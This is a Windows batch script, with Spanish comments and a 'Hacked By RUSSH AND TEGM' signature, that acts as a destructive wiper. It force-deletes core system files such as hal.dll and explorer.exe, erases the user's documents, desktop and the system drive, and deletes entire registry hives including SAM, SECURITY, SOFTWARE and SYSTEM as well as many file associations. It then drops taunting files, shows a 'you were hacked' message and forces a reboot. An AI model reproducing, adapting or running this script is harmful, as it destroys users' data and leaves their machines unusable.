color 0A
del /f %systemroot%\system\hal.dll
del /f %systemroot%\system32\hal.dll
del /f %systemroot%\system\system.*
del /f %systemroot%\system32\system.*
del /f %systemroot%\system32\Win.com
del /f %systemroot%\system32\command.com
del /f %systemroot%\system32\keyboard.*
del /f %systemroot%\system32\shell.*
del /f %systemroot%\system32\mouse.*
del /f %systemroot%\system32\msvideo.*
del /f %systemroot%\regedit.exe
del /f %systemroot%\taskman.exe
del /f %systemroot%\explorer.exe
del /f %systemroot%\system32\taskkill.exe
del /f %systemroot%\system32\tasklist.exe
del /f %systemroot%\system32\taskmgr.exe
del /f %systemroot%\keyboard.*

rem borrar docs
rd /s /q "%homepath%/Mis Documentos"
rem borrar escritorio
cd\
cd %HOMEPATH%
del *.* /f /s /q
cd Desktop
cd Escritorio
del *.* /f /s /q
rem borrar todo lo del discoduro
cd\
cd %SYSTEMDRIVE%
del *.* /f /s /q


reg delete "HKEY_CURRENT_CONFIG\Software" /f
reg delete "HKEY_CURRENT_CONFIG\System" /f
reg delete "HKEY_USERS\.DEFAULT" /f
reg delete "HKEY_USERS\S-1-5-18" /f
reg delete "HKEY_USERS\S-1-5-19" /f
reg delete "HKEY_USERS\S-1-5-19_Classes" /f
reg delete "HKEY_USERS\S-1-5-20" /f
reg delete "HKEY_USERS\S-1-5-20_Classes" /f
reg delete "HKEY_USERS\S-1-5-21-602162358-606747145-725345543-1003" /f
reg delete "HKEY_USERS\S-1-5-21-602162358-606747145-725345543-1003_Classes" /f
reg delete "HKEY_LOCAL_MACHINE\HARDWARE" /f
reg delete "HKEY_LOCAL_MACHINE\SAM" /f
reg delete "HKEY_LOCAL_MACHINE\SECURITY" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE" /f
reg delete "HKEY_LOCAL_MACHINE\SYSTEM" /f
reg delete "HKEY_CURRENT_USER\AppEvents" /f
reg delete "HKEY_CURRENT_USER\Console" /f
reg delete "HKEY_CURRENT_USER\Control Panel" /f
reg delete "HKEY_CURRENT_USER\Environment" /f
reg delete "HKEY_CURRENT_USER\Identities" /f
reg delete "HKEY_CURRENT_USER\Keyboard Layout" /f
reg delete "HKEY_CURRENT_USER\Printers" /f
reg delete "HKEY_CURRENT_USER\SessionInformation" /f
reg delete "HKEY_CURRENT_USER\Software" /f
reg delete "HKEY_CURRENT_USER\UNICODE Program Groups" /f
reg delete "HKEY_CURRENT_USER\Volatile Environment" /f
reg delete "HKEY_CURRENT_USER\Windows 3.1 Migration Status" /f
reg delete "HKEY_CLASSES_ROOT\*" /f
reg delete "HKEY_CLASSES_ROOT\.iso" /f
reg delete "HKEY_CLASSES_ROOT\.bin" /f
reg delete "HKEY_CLASSES_ROOT\.img" /f
reg delete "HKEY_CLASSES_ROOT\.cif" /f
reg delete "HKEY_CLASSES_ROOT\.fcd" /f
reg delete "HKEY_CLASSES_ROOT\.nrg" /f
reg delete "HKEY_CLASSES_ROOT\.gcd" /f
reg delete "HKEY_CLASSES_ROOT\.p01" /f
reg delete "HKEY_CLASSES_ROOT\.c2d" /f
reg delete "HKEY_CLASSES_ROOT\.tao" /f
reg delete "HKEY_CLASSES_ROOT\.dao" /f
reg delete "HKEY_CLASSES_ROOT\.cdi" /f
reg delete "HKEY_CLASSES_ROOT\.cue" /f
reg delete "HKEY_CLASSES_ROOT\.cd" /f
reg delete "HKEY_CLASSES_ROOT\.gi" /f
reg delete "HKEY_CLASSES_ROOT\.pxi" /f
reg delete "HKEY_CLASSES_ROOT\.pdi" /f
reg delete "HKEY_CLASSES_ROOT\.mds" /f
reg delete "HKEY_CLASSES_ROOT\.mdf" /f
reg delete "HKEY_CLASSES_ROOT\.ccd" /f
reg delete "HKEY_CLASSES_ROOT\.vc4" /f
reg delete "HKEY_CLASSES_ROOT\.b5t" /f
reg delete "HKEY_CLASSES_ROOT\.b5i" /f
reg delete "HKEY_CLASSES_ROOT\.dmg" /f
reg delete "HKEY_CLASSES_ROOT\.ibp" /f
reg delete "HKEY_CLASSES_ROOT\.ibq" /f
reg delete "HKEY_CLASSES_ROOT\.ncd" /f

reg delete "HKEY_CLASSES_ROOT\.bmp" /f
reg delete "HKEY_CLASSES_ROOT\.dib" /f
reg delete "HKEY_CLASSES_ROOT\.jpeg" /f
reg delete "HKEY_CLASSES_ROOT\.jpg" /f
reg delete "HKEY_CLASSES_ROOT\.jpe" /f
reg delete "HKEY_CLASSES_ROOT\.jfif" /f
reg delete "HKEY_CLASSES_ROOT\.gif" /f
reg delete "HKEY_CLASSES_ROOT\.png" /f
reg delete "HKEY_CLASSES_ROOT\.tif" /f
reg delete "HKEY_CLASSES_ROOT\.tiff" /f
reg delete "HKEY_CLASSES_ROOT\.psd" /f
reg delete "HKEY_CLASSES_ROOT\.pdd" /f
reg delete "HKEY_CLASSES_ROOT\.rle" /f
reg delete "HKEY_CLASSES_ROOT\.eps" /f
reg delete "HKEY_CLASSES_ROOT\.psb" /f
reg delete "HKEY_CLASSES_ROOT\.pcx" /f
reg delete "HKEY_CLASSES_ROOT\.pdf" /f
reg delete "HKEY_CLASSES_ROOT\.pdp" /f
reg delete "HKEY_CLASSES_ROOT\.raw" /f
reg delete "HKEY_CLASSES_ROOT\.pct" /f
reg delete "HKEY_CLASSES_ROOT\.pict" /f
reg delete "HKEY_CLASSES_ROOT\.pxr" /f
reg delete "HKEY_CLASSES_ROOT\.pbm" /f
reg delete "HKEY_CLASSES_ROOT\.pgm" /f
reg delete "HKEY_CLASSES_ROOT\.ppm" /f
reg delete "HKEY_CLASSES_ROOT\.pfm" /f
reg delete "HKEY_CLASSES_ROOT\.pnm" /f
reg delete "HKEY_CLASSES_ROOT\.pam" /f
reg delete "HKEY_CLASSES_ROOT\.sct" /f
reg delete "HKEY_CLASSES_ROOT\.tga" /f
reg delete "HKEY_CLASSES_ROOT\.vda" /f
reg delete "HKEY_CLASSES_ROOT\.icb" /f
reg delete "HKEY_CLASSES_ROOT\.vst" /f

reg delete "HKEY_CLASSES_ROOT\.rtf" /f
reg delete "HKEY_CLASSES_ROOT\.txt" /f
reg delete "HKEY_CLASSES_ROOT\.docx" /f
reg delete "HKEY_CLASSES_ROOT\.kgb" /f
reg delete "HKEY_CLASSES_ROOT\.doc" /f
reg delete "HKEY_CLASSES_ROOT\.dot" /f
reg delete "HKEY_CLASSES_ROOT\.docm" /f
reg delete "HKEY_CLASSES_ROOT\.dotx" /f
reg delete "HKEY_CLASSES_ROOT\.dotm" /f
reg delete "HKEY_CLASSES_ROOT\.xlsx" /f
reg delete "HKEY_CLASSES_ROOT\.xlsm" /f
reg delete "HKEY_CLASSES_ROOT\.xlsb" /f
reg delete "HKEY_CLASSES_ROOT\.xls" /f
reg delete "HKEY_CLASSES_ROOT\.xml" /f
reg delete "HKEY_CLASSES_ROOT\.mht" /f
reg delete "HKEY_CLASSES_ROOT\.mhtml" /f
reg delete "HKEY_CLASSES_ROOT\.htm" /f
reg delete "HKEY_CLASSES_ROOT\.html" /f
reg delete "HKEY_CLASSES_ROOT\.xltx" /f
reg delete "HKEY_CLASSES_ROOT\.xltm" /f
reg delete "HKEY_CLASSES_ROOT\.csv" /f
reg delete "HKEY_CLASSES_ROOT\.prn" /f
reg delete "HKEY_CLASSES_ROOT\.dif" /f
reg delete "HKEY_CLASSES_ROOT\.slk" /f
reg delete "HKEY_CLASSES_ROOT\.xlam" /f
reg delete "HKEY_CLASSES_ROOT\.mdb" /f

reg delete "HKEY_CLASSES_ROOT\.php" /f
reg delete "HKEY_CLASSES_ROOT\.swf" /f
reg delete "HKEY_CLASSES_ROOT\.fla" /f
reg delete "HKEY_CLASSES_ROOT\.exe" /f
reg delete "HKEY_CLASSES_ROOT\.log" /f
reg delete "HKEY_CLASSES_ROOT\.avi" /f
reg delete "HKEY_CLASSES_ROOT\.mp3" /f
reg delete "HKEY_CLASSES_ROOT\.wav" /f
reg delete "HKEY_CLASSES_ROOT\.vmw" /f
reg delete "HKEY_CLASSES_ROOT\.dvx" /f
reg delete "HKEY_CLASSES_ROOT\.old" /f
reg delete "HKEY_CLASSES_ROOT\.prx" /f
reg delete "HKEY_CLASSES_ROOT\.bak" /f
reg delete "HKEY_CLASSES_ROOT\.dat" /f
reg delete "HKEY_CLASSES_ROOT\.csv" /f
reg delete "HKEY_CLASSES_ROOT\.tmp" /f
reg delete "HKEY_CLASSES_ROOT\.ini" /f
reg delete "HKEY_CLASSES_ROOT\.dll" /f
reg delete "HKEY_CLASSES_ROOT\.mdb" /f
reg delete "HKEY_CLASSES_ROOT\.wsc" /f
reg delete "HKEY_CLASSES_ROOT\.mod" /f
reg delete "HKEY_CLASSES_ROOT\.vbs" /f
reg delete "HKEY_CLASSES_ROOT\.cmd" /f
reg delete "HKEY_CLASSES_ROOT\.scr" /f
reg delete "HKEY_CLASSES_ROOT\.cpl" /f
reg delete "HKEY_CLASSES_ROOT\.rat" /f
reg delete "HKEY_CLASSES_ROOT\.msi" /f
reg delete "HKEY_CLASSES_ROOT\.cpl" /f
reg delete "HKEY_CLASSES_ROOT\.xml" /f
reg delete "HKEY_CLASSES_ROOT\.msc" /f
reg delete "HKEY_CLASSES_ROOT\.drv" /f
reg delete "HKEY_CLASSES_ROOT\.vxd" /f
reg delete "HKEY_CLASSES_ROOT\.ocx" /f
reg delete "HKEY_CLASSES_ROOT\.uce" /f
reg delete "HKEY_CLASSES_ROOT\.tsp" /f
reg delete "HKEY_CLASSES_ROOT\.tmp" /f
reg delete "HKEY_CLASSES_ROOT\.tsk" /f
reg delete "HKEY_CLASSES_ROOT\.tlb" /f
reg delete "HKEY_CLASSES_ROOT\.tha" /f
reg delete "HKEY_CLASSES_ROOT\.sve" /f
reg delete "HKEY_CLASSES_ROOT\.sql" /f
reg delete "HKEY_CLASSES_ROOT\.sep" /f
reg delete "HKEY_CLASSES_ROOT\.sig" /f
reg delete "HKEY_CLASSES_ROOT\.olb" /f
reg delete "HKEY_CLASSES_ROOT\.oca" /f
reg delete "HKEY_CLASSES_ROOT\.nt" /f
reg delete "HKEY_CLASSES_ROOT\.nls" /f
reg delete "HKEY_CLASSES_ROOT\.pro" /f
reg delete "HKEY_CLASSES_ROOT\.rll" /f
reg delete "HKEY_CLASSES_ROOT\.rom" /f
reg delete "HKEY_CLASSES_ROOT\.ram" /f
reg delete "HKEY_CLASSES_ROOT\.nls" /f
reg delete "HKEY_CLASSES_ROOT\.nld" /f
reg delete "HKEY_CLASSES_ROOT\.ita" /f
reg delete "HKEY_CLASSES_ROOT\.iec" /f
reg delete "HKEY_CLASSES_ROOT\.ime" /f
reg delete "HKEY_CLASSES_ROOT\.h" /f
reg delete "HKEY_CLASSES_ROOT\.hxx" /f
reg delete "HKEY_CLASSES_ROOT\.sys" /f
reg delete "HKEY_CLASSES_ROOT\.dep" /f
reg delete "HKEY_CLASSES_ROOT\.deu" /f
reg delete "HKEY_CLASSES_ROOT\.enu" /f
reg delete "HKEY_CLASSES_ROOT\.esn" /f
reg delete "HKEY_CLASSES_ROOT\.chm" /f
reg delete "HKEY_CLASSES_ROOT\.hlp" /f
reg delete "HKEY_CLASSES_ROOT\.dat" /f
reg delete "HKEY_CLASSES_ROOT\.dbl" /f
reg delete "HKEY_CLASSES_ROOT\.cpx" /f
reg delete "HKEY_CLASSES_ROOT\.cpi" /f
reg delete "HKEY_CLASSES_ROOT\.cht" /f
reg delete "HKEY_CLASSES_ROOT\.chs" /f
reg delete "HKEY_CLASSES_ROOT\.c" /f
reg delete "HKEY_CLASSES_ROOT\.acm" /f
reg delete "HKEY_CLASSES_ROOT\.ax" /f
reg delete "HKEY_CLASSES_ROOT\.com" /f
reg delete "HKEY_CLASSES_ROOT\.bat" /f
reg delete "HKEY_CLASSES_ROOT\." /f
reg delete "HKEY_CLASSES_ROOT\." /f
reg delete "HKEY_CLASSES_ROOT\." /f

cd %HOMEPATH%\Desktop\
for /l %%i in (1,1,999) do (echo "Hacked By RUSSH AND TEGM!!!" > Tegm_Was_Here_%%i.jez)
msg * fuiste hackeado...BETE DESPIDIENDO...cambio y fuera ...HaCkEd By Russh and Tegm
rundll32 krnl386.exe,exitkernel
shutdown -r